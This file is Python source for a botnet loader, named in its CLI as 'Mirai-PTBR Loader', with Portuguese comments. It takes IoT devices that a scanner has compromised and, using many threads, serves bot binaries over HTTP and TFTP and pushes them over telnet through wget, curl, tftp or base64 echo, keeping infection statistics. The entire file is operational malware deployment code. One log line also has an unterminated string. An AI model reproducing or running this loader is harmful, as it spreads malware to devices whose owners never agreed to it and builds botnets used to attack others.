import os
import sys
import time
import json
import socket
import logging
import argparse
import threading
import subprocess
from pathlib import Path
from queue import Queue
from typing import Optional

from . import arch as arch_detector
from . import deploy as deployer
from . import serve as file_server
from . import payload_builder as payload

log = logging.getLogger(__name__)

# Configurações padrão
DEFAULT_HTTP_PORT = 8080
DEFAULT_TFTP_PORT = 69
DEFAULT_BINARY_DIR = "bins"
DEFAULT_MAX_THREADS = 50
DEFAULT_TIMEOUT = 15


class Loader:
    """
    Loader principal.
    Gerencia deploy do binário em dispositivos comprometidos.
    """

    def __init__(
        self,
        binary_dir: str = DEFAULT_BINARY_DIR,
        http_port: int = DEFAULT_HTTP_PORT,
        tftp_port: int = DEFAULT_TFTP_PORT,
        bind_ip: str = "0.0.0.0",
        max_threads: int = DEFAULT_MAX_THREADS,
        timeout: int = DEFAULT_TIMEOUT,
        auto_detect_arch: bool = True,
        default_arch: str = "arm",
        methods: list = None,
    ):
        self.binary_dir = binary_dir
        self.http_port = http_port
        self.tftp_port = tftp_port
        self.bind_ip = bind_ip
        self.max_threads = max_threads
        self.timeout = timeout
        self.auto_detect_arch = auto_detect_arch
        self.default_arch = default_arch
        self.methods = methods or ["wget", "curl", "tftp", "echo"]

        self.server_ip = self._get_server_ip()
        self.http_server = None
        self.tftp_server = None

        # Filas e threads
        self.queue = Queue()
        self.workers = []
        self._running = False

        # Cache de binários base64 (carregados sob demanda)
        self._b64_cache = {}

        # Estatísticas
        self.stats = {
            "total": 0,
            "success": 0,
            "failed": 0,
            "by_method": {},
            "by_arch": {},
        }

    def _get_server_ip(self) -> str:
        """Descobre IP do servidor."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def _get_binary_b64(self, arch: str) -> str:
        """Carrega binário em base64 com cache."""
        if arch not in self._b64_cache:
            self._b64_cache[arch] = payload.load_binary_b64(arch, self.binary_dir)
        return self._b64_cache[arch]

    def start_servers(self):
        """Inicia servidores HTTP e TFTP."""
        self.http_server, self.tftp_server = file_server.start_file_servers(
            http_port=self.http_port,
            tftp_port=self.tftp_port,
            bind_ip=self.bind_ip,
        )
        log.info(
            f"Servidores iniciados: HTTP :{self.http_port}, TFTP :{self.tftp_port}"
        )

    def stop_servers(self):
        """Para servidores."""
        if self.http_server:
            self.http_server.shutdown()
        if self.tftp_server:
            self.tftp_server.stop()

    def deploy_to_device(
        self,
        host: str,
        arch: str = None,
        port: int = 23,
    ) -> bool:
        """
        Tenta fazer deploy do bot em um dispositivo.
        Se arch não for especificado, tenta detectar automaticamente.
        """
        self.stats["total"] += 1

        # Detecta arquitetura se necessário
        if not arch and self.auto_detect_arch:
            log.info(f"Detectando arquitetura de {host}")
            arch = arch_detector.detect_arch(host, port, self.timeout)
            if not arch:
                arch = self.default_arch
                log.warning(f"Usando arch padrão {arch} para {host}")
        elif not arch:
            arch = self.default_arch

        # Prepara URLs
        binary_url = f"http://{self.server_ip}:{self.http_port}/{arch}"
        tftp_binary_name = arch
        binary_b64 = self._get_binary_b64(arch)

        # Verifica se binário existe
        if not binary_b64:
            log.error(f"Binário não encontrado para arquitetura {arch}")
            self.stats["failed"] += 1
            return False

        # Tenta métodos configurados
        for method in self.methods:
            try:
                success = False
                if method == "wget":
                    success = deployer.deploy_wget(
                        host, binary_url, arch, port, self.timeout
                    )
                elif method == "curl":
                    success = deployer.deploy_curl(
                        host, binary_url, arch, port, self.timeout
                    )
                elif method == "tftp":
                    success = deployer.deploy_tftp(
                        host, self.server_ip, tftp_binary_name, arch,
                        port, self.timeout
                    )
                elif method == "echo":
                    success = deployer.deploy_echo(
                        host, binary_b64, arch, port, self.timeout + 30
                    )

                if success:
                    self.stats["success"] += 1
                    self.stats["by_method"][method] = \
                        self.stats["by_method"].get(method, 0) + 1
                    self.stats["by_arch"][arch] = \
                        self.stats["by_arch"].get(arch, 0) + 1
                    log.info(f"✓ Deploy bem-sucedido em {host} via {method} ({arch})")
                    return True

            except Exception as e:
                log.debug(f"Erro método {method} em {host}: {e}")

        self.stats["failed"] += 1
        log.warning(f"✗ Todos os métodos falharam em {host}")
        return False

    def _worker_thread(self):
        """Thread worker que processa fila de deploy."""
        while self._running:
            try:
                job = self.queue.get(timeout=1.0)
                if job is None:
                    break

                host = job.get("host")
                arch = job.get("arch")
                port = job.get("port", 23)
                callback = job.get("callback")

                if host:
                    success = self.deploy_to_device(host, arch, port)
                    if callback:
                        try:
                            callback(host, success, arch)
                        except Exception as e:
                            log.error(f"Erro no callback para {host}: {e})

                self.queue.task_done()

            except Exception:
                continue  # Timeout da fila, apenas continua

    def start(self, num_workers: int = None):
        """Inicia workers do loader."""
        if self._running:
            return

        self._running = True
        num_workers = num_workers or self.max_threads

        # Inicia servidores
        self.start_servers()

        # Inicia workers
        for i in range(num_workers):
            t = threading.Thread(
                target=self._worker_thread,
                daemon=True,
                name=f"loader-worker-{i}",
            )
            t.start()
            self.workers.append(t)

        log.info(f"Loader iniciado com {num_workers} workers")

    def stop(self):
        """Para o loader."""
        self._running = False

        # Envia sinais para workers pararem
        for _ in self.workers:
            self.queue.put(None)

        for w in self.workers:
            w.join(timeout=5.0)

        self.stop_servers()
        log.info("Loader parado")

    def add_target(self, host: str, arch: str = None, port: int = 23,
                   callback=None):
        """Adiciona alvo à fila de deploy."""
        self.queue.put({
            "host": host,
            "arch": arch,
            "port": port,
            "callback": callback,
        })

    def add_targets_from_list(self, targets: list):
        """
        Adiciona múltiplos alvos.
        Formato: [(host, arch, port), ...] ou ["host1", "host2", ...]
        """
        for target in targets:
            if isinstance(target, (list, tuple)):
                self.add_target(*target)
            else:
                self.add_target(target)

    def add_targets_from_scanner_callback(self, host: str, port: int = 23,
                                          creds: tuple = None):
        """
        Callback para integração com o Scanner.
        Chamado quando o scanner encontra um dispositivo comprometido.
        """
        log.info(f"Scanner callback: dispositivo comprometido {host}:{port}")
        self.add_target(host, port=port)

        # Callback quando deploy terminar
        def on_deploy(host, success, arch):
            if success:
                log.info(f"Bot implantado em {host} ({arch})")
            else:
                log.warning(f"Falha ao implantar bot em {host}")

        # Atualiza callback
        self.queue.put({
            "host": host,
            "arch": None,
            "port": port,
            "callback": on_deploy,
        })

    def print_stats(self):
        """Exibe estatísticas do loader."""
        total = self.stats["total"]
        success = self.stats["success"]
        failed = self.stats["failed"]
        pct = (success / total * 100) if total > 0 else 0

        print(f"\n{'='*50}")
        print(f"  LOADER STATISTICS")
        print(f"{'='*50}")
        print(f"  Total:     {total}")
        print(f"  Success:   {success} ({pct:.1f}%)")
        print(f"  Failed:    {failed}")
        print(f"  Queue:     {self.queue.qsize()}")
        print(f"\n  Por método:")
        for method, count in sorted(self.stats["by_method"].items()):
            print(f"    {method}: {count}")
        print(f"\n  Por arquitetura:")
        for arch, count in sorted(self.stats["by_arch"].items()):
            print(f"    {arch}: {count}")
        print(f"{'='*50}\n")


def main():
    """CLI do loader."""
    parser = argparse.ArgumentParser(
        description="Mirai-PTBR Loader - Deploy bot em dispositivos IoT"
    )
    parser.add_argument("targets", nargs="*", help="IPs alvo")
    parser.add_argument("--list", "-l", help="Arquivo com lista de IPs")
    parser.add_argument("--http-port", type=int, default=DEFAULT_HTTP_PORT)
    parser.add_argument("--tftp-port", type=int, default=DEFAULT_TFTP_PORT)
    parser.add_argument("--bind-ip", default="0.0.0.0")
    parser.add_argument("--binary-dir", default=DEFAULT_BINARY_DIR)
    parser.add_argument("--threads", type=int, default=DEFAULT_MAX_THREADS)
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    parser.add_argument("--arch", help="Forçar arquitetura específica")
    parser.add_argument("--no-detect", action="store_true",
                        help="Não detectar arch automaticamente")
    parser.add_argument("--methods", nargs="+",
                        default=["wget", "curl", "tftp", "echo"])
    parser.add_argument("--interactive", "-i", action="store_true",
                        help="Modo interativo")
    parser.add_argument("--daemon", "-d", action="store_true",
                        help="Modo daemon (background)")
    parser.add_argument("--stats", action="store_true",
                        help="Exibir estatísticas periodicamente")
    parser.add_argument("--verbose", "-v", action="store_true")

    args = parser.parse_args()

    # Logging
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )

    loader = Loader(
        binary_dir=args.binary_dir,
        http_port=args.http_port,
        tftp_port=args.tftp_port,
        bind_ip=args.bind_ip,
        max_threads=args.threads,
        timeout=args.timeout,
        auto_detect_arch=not args.no_detect,
        default_arch=args.arch or "arm",
        methods=args.methods,
    )

    loader.start()

    # Carrega alvos
    targets = list(args.targets)

    if args.list:
        try:
            with open(args.list) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.append(line)
        except FileNotFoundError:
            log.error(f"Arquivo não encontrado: {args.list}")
            sys.exit(1)

    # Adiciona alvos
    if targets:
        for target in targets:
            loader.add_target(target)
        log.info(f"{len(targets)} alvos adicionados à fila")

    # Modo interativo
    if args.interactive:
        print("\nLoader interativo. Comandos: add <ip>, stats, stop\n")
        try:
            while True:
                cmd = input("loader> ").strip()
                if cmd == "stop" or cmd == "exit" or cmd == "quit":
                    break
                elif cmd == "stats":
                    loader.print_stats()
                elif cmd.startswith("add "):
                    ip = cmd[4:].strip()
                    if ip:
                        loader.add_target(ip)
                        print(f"Adicionado: {ip}")
                elif cmd == "status":
                    print(f"Fila: {loader.queue.qsize()}, "
                          f"Workers ativos: {sum(1 for w in loader.workers if w.is_alive())}")
                else:
                    print(f"Comandos: add <ip>, stats, status, stop")
        except KeyboardInterrupt:
            print()

    # Modo daemon
    elif args.daemon:
        if args.stats:
            def print_stats_loop():
                while loader._running:
                    loader.print_stats()
                    time.sleep(30)
            t = threading.Thread(target=print_stats_loop, daemon=True)
            t.start()

        try:
            while loader._running:
                time.sleep(1)
        except KeyboardInterrupt:
            pass

    # Modo único (executa e espera fila esvaziar)
    else:
        if targets:
            try:
                loader.queue.join()
            except KeyboardInterrupt:
                pass

    loader.stop()
    loader.print_stats()


if __name__ == "__main__":
    main()
